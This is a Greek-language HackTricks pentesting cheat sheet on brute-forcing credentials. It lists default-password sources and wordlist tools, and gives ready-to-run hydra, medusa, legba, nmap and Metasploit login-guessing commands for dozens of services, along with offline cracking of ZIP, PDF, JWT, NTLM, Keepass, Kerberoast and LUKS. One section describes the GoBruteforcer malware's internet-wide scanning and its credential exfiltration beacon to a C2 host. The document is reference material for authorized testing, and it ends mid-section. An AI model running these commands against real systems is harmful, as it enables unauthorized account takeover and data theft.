# Brute Force - Συνοπτικός οδηγός

{{#include ../banners/hacktricks-training.md}}

## Προεπιλεγμένα διαπιστευτήρια

**Κάντε αναζήτηση στο Google** για προεπιλεγμένα διαπιστευτήρια της τεχνολογίας που χρησιμοποιείται ή **δοκιμάστε αυτούς τους συνδέσμους**:

- [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
- [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
- [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
- [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
- [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
- [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
- [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
- [**https://many-passwords.github.io/**](https://many-passwords.github.io)
- [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Δημιουργήστε τα δικά σας λεξικά**

Βρείτε όσες περισσότερες πληροφορίες μπορείτε για τον στόχο και δημιουργήστε ένα προσαρμοσμένο λεξικό. Εργαλεία που μπορεί να βοηθήσουν:

### Crunch

```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```

### Λίστες λέξεων βασισμένες σε ιστοσελίδες

```bash
# Cewl gets words from the victims page
cewl example.com -m 5 -w words.txt

# Tok (https://github.com/tomnomnom/hacks/tree/master/tok) gets words from a list of URLs
cat /path/to/urls.txt | tok

# https://github.com/m4ll0k/BBTz/blob/master/getjswords.py gets words from a list of JS URLs
cat /path/to/js-urls.txt | python3 getjswords.py
```

### [CUPP](https://github.com/Mebus/cupp)

Δημιουργήστε κωδικούς πρόσβασης με βάση όσα γνωρίζετε για το θύμα (ονόματα, ημερομηνίες...)

```
python3 cupp.py -h
```

### [Wister](https://github.com/cycurity/wister)

Ένα εργαλείο δημιουργίας wordlist, στο οποίο μπορείτε να εισαγάγετε ένα σύνολο λέξεων και να δημιουργήσετε πολλαπλές παραλλαγές τους, φτιάχνοντας μια μοναδική και ιδανική wordlist για έναν συγκεκριμένο στόχο.

```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

 __          _______  _____ _______ ______ _____
 \ \        / /_   _|/ ____|__   __|  ____|  __ \
  \ \  /\  / /  | | | (___    | |  | |__  | |__) |
   \ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
    \  /\  /   _| |_ ____) |  | |  | |____| | \ \
     \/  \/   |_____|_____/   |_|  |______|_|  \_\

      Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```

### [pydictor](https://github.com/LandGrey/pydictor)

### Wordlists

- [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
- [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
- [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
- [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
- [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
- [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
- [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
- [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

## Ροή εργασίας brute-forcer για ολόκληρο το Internet (διδάγματα από scanners βασισμένα στη Go)

Οι ακόλουθες συμπεριφορές παρατηρήθηκαν στη ροή σάρωσης του malware GoBruteforcer· οι ακριβείς τιμές εξαρτώνται από το δείγμα.<sup>[[1]](#references)</sup>

- Διατηρείτε **pools εργαζομένων προσαρμοσμένα στην αρχιτεκτονική** (για παράδειγμα, 95 ταυτόχρονους εργαζομένους σε `x86_64/arm64`, 85 σε `i686`, 35 σε `armv5tel` και 50 από προεπιλογή σε άλλες αρχιτεκτονικές), ελέγχετε τους ενεργούς εργαζομένους κάθε δευτερόλεπτο και δημιουργείτε αντικαταστάτες όταν ο αριθμός πέφτει κάτω από τον στόχο· κάθε εργαζόμενος διαχειρίζεται το πολύ μία IP-στόχο πριν τερματιστεί.
- Δημιουργείτε **τυχαίες δημόσιες διευθύνσεις IPv4**, αλλά απορρίπτετε προφανώς μη δρομολογήσιμα και επιλεγμένα εύρη που αποφεύγει ο operator: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, εύρη `/8` με μεγάλη χρήση από cloud (`3/15/16/56`) και εύρη `/8` που σχετίζονται με το DoD (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
- **Ελέγχετε τη θύρα της υπηρεσίας** με σύντομο timeout (~2s) πριν επιχειρήσετε **συνδέσεις με διαπιστευτήρια σε cleartext** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin μέσω HTTP/80) και χρησιμοποιείτε μια **μικρή ενσωματωμένη λίστα διαπιστευτηρίων** αν αποτύχει η λήψη διαπιστευτηρίων από το C2.
- **Εξάγετε τα ευρήματα** μέσω μικρών HTTP GET beacon, όπως `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (κωδικοί υπηρεσιών όπως `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), επαναχρησιμοποιώντας ένα κοινό browser User-Agent για να μοιάζουν με κανονική κίνηση.
- Το **phpMyAdmin spray** μπορεί να δοκιμάσει brute-force σε περίπου 80 πιθανά paths με `GET /index.php?lang=en`, να εντοπίσει δείκτες PMA (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) και να αναλύσει το `codemirror.css?v=X.Y.Z` για να επιλέξει μέθοδο authentication: οι εκδόσεις `<4.9` δέχονται παραμέτρους GET `pma_username`/`pma_password`· οι εκδόσεις `>=4.9` χρησιμοποιούν POST με `server=1`, CSRF `token` και τα ίδια διαπιστευτήρια.

## Υπηρεσίες

Ταξινομημένες αλφαβητικά κατά όνομα υπηρεσίας.

### AFP

```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```

### AJP

```bash
nmap --script ajp-brute -p 8009 <IP>
```

### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM και Solace)

```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```

### Cassandra

```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```

### ClickHouse

[bruter](https://github.com/vflame6/bruter)

```bash
bruter clickhouse -u default -p passwords.txt localhost:9000
```

### CouchDB

```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```

### Docker Registry

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```

### Elasticsearch

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```

### FTP

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```

### Γενικό Brute Force HTTP

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Basic Auth

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```

### HTTP - NTLM

```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```

### HTTP - Φόρμα POST

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```

Για το http**s** πρέπει να αλλάξετε από "http-post-form" σε "**https-post-form"

### **HTTP - CMS --** (W)ordpress, (J)oomla ή (D)rupal ή (M)oodle

```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```

### IMAP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```

### IRC

```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```

### ISCSI

```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```

### JWT

```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```

### LDAP

```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```

### MQTT

```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```

### Mongo

```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```

### MSSQL

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
```

```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```

### MySQL

```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```

### OracleSQL

```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```

Για να χρησιμοποιήσετε το **oracle_login** με το **patator**, πρέπει να **εγκαταστήσετε**:

```bash
pip3 install cx_Oracle --upgrade
```

[Bruteforce hash OracleSQL εκτός σύνδεσης](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):

```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```

### POP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```

### PostgreSQL

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```

### PPTP

Μπορείτε να κατεβάσετε το πακέτο `.deb` για εγκατάσταση από [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)

```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```

### RDP

```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```

### Redis

```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```

### Rexec

Για τη συμπεριφορά της υπηρεσίας Rexec με έλεγχο ταυτότητας μέσω κωδικού πρόσβασης, δείτε [Pentesting Rexec (512/TCP)](../network-services-pentesting/512-pentesting-rexec.md).

```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```

### Rlogin

Για αυθεντικοποίηση μέσω αξιόπιστου host και πρόσβαση σε τερματικό, δείτε [Pentesting Rlogin (513/TCP)](../network-services-pentesting/pentesting-rlogin.md#rlogin-513tcp).

```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```

### Rsh

Για authentication μέσω trusted hosts και remote commands, δείτε [Pentesting Rsh (514/TCP)](../network-services-pentesting/pentesting-rlogin.md#rsh-514tcp).

```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```

[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```

### RTSP

```bash
hydra -l root -P passwords.txt <IP> rtsp
```

### SFTP

```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

### SNMP

```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```

### SMB

```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```

### SMPP

```bash
bruter smpp -u smppclient1 -p passwords.txt localhost:2775
```

### SMTP

```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```

### SOCKS

```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```

### SQL Server

```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```

### SSH

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

#### Αδύναμα SSH keys / Προβλέψιμο PRNG του Debian

Ορισμένα συστήματα έχουν γνωστές αδυναμίες στο τυχαίο seed που χρησιμοποιείται για τη δημιουργία κρυπτογραφικού υλικού. Αυτό μπορεί να οδηγήσει σε δραστικά μικρότερο keyspace, στο οποίο μπορεί να γίνει επίθεση brute force με εργαλεία όπως το [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Διατίθενται επίσης προπαρασκευασμένα σύνολα αδύναμων keys, όπως το [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ και OpenMQ)

Το πρωτόκολλο κειμένου STOMP είναι ένα ευρέως χρησιμοποιούμενο πρωτόκολλο ανταλλαγής μηνυμάτων που **επιτρέπει την απρόσκοπτη επικοινωνία και αλληλεπίδραση με δημοφιλείς υπηρεσίες ουρών μηνυμάτων**, όπως οι RabbitMQ, ActiveMQ, HornetQ και OpenMQ. Παρέχει μια τυποποιημένη και αποτελεσματική προσέγγιση για την ανταλλαγή μηνυμάτων και την εκτέλεση διαφόρων λειτουργιών ανταλλαγής μηνυμάτων.

```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```

### Telnet

```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
    --username admin \
    --password wordlists/passwords.txt \
    --target localhost:23 \
    --telnet-user-prompt "login: " \
    --telnet-pass-prompt "Password: " \
    --telnet-prompt ":~$ " \
    --single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```

### VNC

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```

### Winrm

```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```


## Τοπικά

### Διαδικτυακές βάσεις δεδομένων cracking

- [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 με/χωρίς ESS/SSP και με οποιαδήποτε τιμή challenge)
- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, captures WPA2 και αρχεία MSOffice, ZIP, PDF...)
- [https://crackstation.net/](https://crackstation.net) (Hashes)
- [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
- [https://gpuhash.me/](https://gpuhash.me) (Hashes και hashes αρχείων)
- [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
- [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
- [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
- [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
- [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Ελέγξτε το πριν επιχειρήσετε να κάνετε brute force ένα Hash.

### ZIP

```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```

#### Known plaintext zip attack

Πρέπει να γνωρίζετε το **plaintext** (ή μέρος του plaintext) **ενός αρχείου που περιέχεται** στο κρυπτογραφημένο zip. Μπορείτε να ελέγξετε **τα ονόματα και τα μεγέθη των αρχείων που περιέχονται** σε ένα κρυπτογραφημένο zip εκτελώντας: **`7z l encrypted.zip`**\
Κατεβάστε το [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) από τη σελίδα των releases.

```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```

### 7z

```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```

### PDF

```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```

### Κωδικός πρόσβασης ιδιοκτήτη PDF

Για να κάνετε crack τον κωδικό πρόσβασης ιδιοκτήτη ενός PDF, δείτε εδώ: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT

```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```

### NTLM cracking

```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```

### Keepass

```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Keberoasting

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Lucks εικόνα

#### Μέθοδος 1

Εγκατάσταση: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)

```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

#### Μέθοδος 2

```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

Ένα ακόμα tutorial για Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql

```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
